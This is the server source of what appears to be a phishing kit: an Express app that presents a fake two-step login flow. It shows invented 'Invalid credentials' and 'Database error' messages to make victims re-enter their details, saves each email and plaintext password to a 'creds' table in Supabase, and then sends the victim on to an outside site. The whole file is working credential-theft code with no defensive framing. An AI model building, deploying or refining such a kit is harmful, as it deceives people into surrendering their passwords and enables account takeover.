const path = require('path');
require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Parse URL-encoded bodies (for simple form submissions)
app.use(express.urlencoded({ extended: true }));

// Parse cookies
app.use(cookieParser());

// Supabase PostgreSQL database connection
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Initialize database table
/*
// Initialize database table
// Tables 'creds' and 'session_count' should be created in the Supabase dashboard or via SQL Editor.
// Automatic creation logic removed as Supabase JS client is for DML.

CREATE TABLE IF NOT EXISTS creds (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) NOT NULL,
  password VARCHAR(255) NULL,
  session_id VARCHAR(255) NULL,
  session_expires_at TIMESTAMP NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS session_count (
  id SERIAL PRIMARY KEY,
  session_id VARCHAR(255) NOT NULL,
  count INT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
*/

// Helper function to generate unique session ID
function generateSessionId() {
  return crypto.randomUUID();
}

// Helper function to check if session is valid
async function isValidSession(sessionId) {
  if (!sessionId) return false;

  try {
    const { data, error } = await supabase
      .from('session_count')
      .select('*')
      .eq('session_id', sessionId);

    if (error) throw error;
    if (!data || data.length === 0) return false;

    return true;
  } catch (err) {
    console.error('Error checking session', err);
    return false;
  }
}


app.get('/login', async (req, res) => {
  let sessionId = req.cookies.sessionId;
  console.log("login get session id:", sessionId)
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    sessionId = generateSessionId()
    res.cookie('sessionId', sessionId, {
      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
    });
    await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
  }

  res.render('login', {
    sessionId: sessionId,
    error: req.query.error,
    success: req.query.success,
  });
});


app.post('/login', async (req, res) => {
  const { email } = req.body;
  // validate email (include regex)
  if (!email || !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    return res.redirect('/login?error=Invalid+email');
  }
  try {
    let sessionId = req.cookies.sessionId;
    console.log("login post session id:", sessionId)
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      sessionId = generateSessionId();
      res.cookie('sessionId', sessionId, {
        maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
      });
      await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
    }

    let { data: sessionCountData, error: countError } = await supabase
      .from('session_count')
      .select('count')
      .eq('session_id', sessionId)
      .single();

    if (countError) throw countError;

    let sessionCount = sessionCountData.count;
    if (sessionCount % 3 === 1) {
      const { error: updateError } = await supabase
        .from('session_count')
        .update({ count: sessionCount + 1 })
        .eq('session_id', sessionId);
      if (updateError) throw updateError;

      console.log("New updated count:", sessionCount + 1)
      return res.redirect('/login?error=Invalid+credentials');
    } else if (sessionCount % 3 === 2) {
      const { error: updateError } = await supabase
        .from('session_count')
        .update({ count: sessionCount + 1 })
        .eq('session_id', sessionId);
      if (updateError) throw updateError;

      console.log("New updated count:", sessionCount + 1)
      return res.redirect('/login?error=Database+error')
    } else {
      await supabase.from('creds').insert([{ email: email, session_id: sessionId }]);
      await supabase.from('session_count').update({ count: 1 }).eq('session_id', sessionId);
      console.log("New updated count:", sessionCount + 1)
      return res.redirect('/login/password')
    }
  } catch (err) {
    console.error('Error during login', err);
    return res.redirect('/login?error=Database+error');
  }
});

app.get('/login/password', async (req, res) => {
  const sessionId = req.cookies.sessionId;
  const isCheckedIn = await isValidSession(sessionId);
  if (!isCheckedIn) {
    return res.redirect('/login')
  }
  let { data: emailData, error: emailError } = await supabase
    .from('creds')
    .select('email')
    .eq('session_id', sessionId)
    .single();

  if (emailError) {
    console.error(emailError);
    return res.redirect('/login');
  }
  let email = emailData.email;

  res.render('password', {
    sessionId: sessionId,
    email: email,
    error: req.query.error
  });
});


app.post('/login/password', async (req, res) => {
  const { password } = req.body;

  try {
    let sessionId = req.cookies.sessionId;
    const isCheckedIn = await isValidSession(sessionId);
    if (!isCheckedIn) {
      return res.redirect('/login')
    }

    let { data: sessionCountData, error: countError } = await supabase
      .from('session_count')
      .select('count')
      .eq('session_id', sessionId)
      .single();

    if (countError) throw countError;
    let sessionCount = sessionCountData.count;

    if (sessionCount % 3 === 1) {
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      return res.redirect('/login/password?error=Invalid+credentials');
    } else if (sessionCount % 3 === 2) {
      await supabase.from('session_count').update({ count: sessionCount + 1 }).eq('session_id', sessionId);
      return res.redirect('/login/password?error=Database+error')
    } else {
      await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
      await supabase.from('session_count').delete().eq('session_id', sessionId);
      return res.redirect(process.env.REDIRECT_URL)
    }
  } catch (err) {
    console.error('Error during login/password', err);
    return res.redirect('/login/password?error=Database+error');
  }
});

app.use((req, res) => {
  res.redirect(process.env.MAIN_REDIRECT_URL)
})

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});


